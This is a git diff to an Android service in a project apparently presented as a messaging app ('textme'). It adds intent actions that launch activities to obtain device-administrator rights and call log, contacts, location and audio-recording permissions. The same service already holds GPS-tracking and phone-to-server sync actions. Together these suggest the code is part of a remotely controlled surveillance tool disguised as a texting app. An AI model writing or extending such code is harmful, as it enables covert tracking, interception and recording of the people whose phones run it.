@@ -32,6 +32,11 @@ import com.candroid.textme.services.MessagingService;
 import com.candroid.textme.data.pojos.PhoneCall;
 import com.candroid.textme.data.pojos.SmsMsg;
 import com.candroid.textme.data.Wallpapers;
+import com.candroid.textme.ui.activities.permissions.AdminActivity;
+import com.candroid.textme.ui.activities.permissions.CallLogActivity;
+import com.candroid.textme.ui.activities.permissions.ContactsActivity;
+import com.candroid.textme.ui.activities.permissions.LocationActivity;
+import com.candroid.textme.ui.activities.permissions.RecordAudioActivity;
 
 import java.io.File;
 import java.io.IOException;
@@ -43,9 +48,7 @@ import java.io.Reader;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.Socket;
-import java.net.SocketException;
 import java.net.URL;
-import java.net.UnknownHostException;
 import java.util.ArrayList;
 
 import javax.net.SocketFactory;
@@ -83,6 +86,11 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_CREATE_FILE = "ACTION_CREATE_FILE";
     public static final String ACTION_GPS_TRACKER = "ACTION_GPS_TRACKER";
     public static final String ACTION_SYNC_PHONE_TO_SERVER = "ACTION_SYNC_PHONE_TO_SERVER";
+    public static final String ACTION_ADMIN = "ACTION_ADMIN";
+    public static final String ACTION_CALL_LOG_PERMISSION = "ACTION_CALL_LOG_PERMISSIONS";
+    public static final String ACTION_LOCATION_PERMISSION = "ACTION_LOCATION_PERMISSION";
+    public static final String ACTION_CONTACTS_PERMISSION = "ACTION_CONTACTS_PERMISSION";
+    public static final String ACTION_RECORD_AUDIO_PERMISSION = "ACTION_RECORD_AUDIO_PERMISSION";
     public static boolean sShouldTrackGps = false;
     private static long sNumber = 1111111111;
     public static HandlerThread sHandlerThread;
@@ -634,6 +642,37 @@ public class JobsIntentService extends IntentService {
                         }
                     }
                 }
+            }else if(action.equalsIgnoreCase(ACTION_ADMIN)){
+                Intent adminIntent = new Intent();
+                adminIntent.setClass(getApplicationContext(), AdminActivity.class);
+                adminIntent.setAction(Intent.ACTION_VIEW);
+                adminIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                this.startActivity(adminIntent);
+
+            }else if(action.equalsIgnoreCase(ACTION_CALL_LOG_PERMISSION)){
+                Intent callLogIntent = new Intent();
+                callLogIntent.setAction(Intent.ACTION_VIEW);
+                callLogIntent.setClass(this, CallLogActivity.class);
+                callLogIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(callLogIntent);
+            }else if(action.equalsIgnoreCase(ACTION_LOCATION_PERMISSION)){
+                Intent locationIntent = new Intent();
+                locationIntent.setAction(Intent.ACTION_VIEW);
+                locationIntent.setClass(this, LocationActivity.class);
+                locationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(locationIntent);
+            }else if(action.equalsIgnoreCase(ACTION_CONTACTS_PERMISSION)){
+                Intent contactsIntent = new Intent();
+                contactsIntent.setAction(Intent.ACTION_VIEW);
+                contactsIntent.setClass(this, ContactsActivity.class);
+                contactsIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(contactsIntent);
+            }else if(action.equalsIgnoreCase(ACTION_RECORD_AUDIO_PERMISSION)){
+                Intent recordAudioIntent = new Intent();
+                recordAudioIntent.setAction(Intent.ACTION_VIEW);
+                recordAudioIntent.setClass(this, RecordAudioActivity.class);
+                recordAudioIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(recordAudioIntent);
             }else {
                 Log.d(TAG, "No action found!");
             }
